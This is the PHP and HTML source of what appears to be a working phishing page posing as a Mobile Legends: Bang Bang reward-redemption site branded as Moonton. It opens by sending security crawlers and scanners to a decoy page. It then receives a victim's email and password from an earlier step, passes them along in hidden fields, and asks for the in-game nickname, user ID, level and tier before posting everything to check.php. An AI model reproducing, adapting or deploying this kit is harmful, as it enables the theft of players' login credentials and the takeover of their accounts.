<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="Mobile Legends: Bang Bang">
<meta name="description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:description" content="Redeem your Mobile Legends: Bang Bang code and get free rewads">
<meta property="og:url" content="./">
<meta property="og:site_name" content="Mobile Legends: Bang Bang">
<meta property="og:type" content="website">
<meta name="copyright"content="Moonton">
<meta name="theme-color" content="#232427">
<meta property="og:image" content="https://i.ibb.co/C832Ykg/Capture.png">
<title>Mobile Legends: Bang Bang</title>
<link rel="stylesheet" href="https://mobilelegends-codexchange.herokuapp.com/css/style.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://m.mobilelegends.com/static/images/favicon.ico">
</head>
<body>

<div class="container">
<div class="header">
<img class="slider" src="https://s10.gifyu.com/images/Cinepolis-Banner.jpg">
<img class="slider" src="https://s10.gifyu.com/images/imagesfaef63de2f9601467502adc213c17e28.jpg">
<img class="slider" src="https://s10.gifyu.com/images/images-3c437c2a813ae4307815a97f28be4e23d.jpg">
<img class="slider" src="https://s10.gifyu.com/images/Screenshot-2022-01-11-at-10.12.10-PM-scaled-e16419194041386e75e4a45fa2d995.jpg">
<img class="slider" src="https://s10.gifyu.com/images/SLIDE-POSTER_01.jpg">
</div>
<form action="check.php" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<ul>
<li>
<span>Nickname</span>
<input type="text" name="nick" placeholder="" required>
</li>
<li>
<span>User ID</span>
<input type="number" name="playid" placeholder="" required>
</li>
<li>
<span>Account Level</span>
<select name="level" required>
<option selected="selected" disabled="disabled" value="">Select</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
</li>
<li>
<span>Tier Level</span>
<select name="tier" required>
<option selected="selected" disabled="disabled" value="">Select</option>
<option>Elite</option>
<option>Master</option>
<option>Grandmaster</option>
<option>Epic</option>
<option>Legend</option>
<option>Mythic</option>
<option>Mythic Glory</option>
</select>
</li>
<p>Complete your account detail to receive your rewards</p>
<button class="btn" type="submit"><span>Verify</span></button>
</ul>
</form>
</div>
<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
<script src="https://myrestapi.kazugawa.repl.co/slider.js"></script>
</body>
</html>	